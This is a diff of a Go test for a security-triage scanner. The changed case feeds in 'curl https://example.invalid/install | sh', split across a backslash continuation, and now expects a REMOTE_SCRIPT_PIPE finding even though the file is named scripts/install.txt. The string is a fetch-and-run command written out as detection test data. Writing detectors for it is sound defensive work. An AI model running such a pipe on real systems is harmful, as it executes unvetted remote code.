@@ -191,12 +191,12 @@ func TestSecurityTriageShellContinuationsAreBoundedAndRequireAnUnescapedBackslas
 		t.Fatalf("quoted pipe must not join shell lines: %#v", findings)
 	}
 
-	findings, err = scanSecurityFile("docs/design.md", "curl https://example.invalid/install \\\n| sh")
+	findings, err = scanSecurityFile("scripts/install.txt", "curl https://example.invalid/install \\\n| sh")
 	if err != nil {
 		t.Fatal(err)
 	}
-	if len(findings) != 0 {
-		t.Fatalf("non-shell text must retain physical line boundaries: %#v", findings)
+	if len(findings) != 1 || findings[0].RuleID != "REMOTE_SCRIPT_PIPE" || findings[0].Line != 1 {
+		t.Fatalf("filename must not disable logical remote-pipe scanning: %#v", findings)
 	}
 
 	oversized := strings.Repeat("x", 600_000) + "\\\n" + strings.Repeat("y", 600_000)
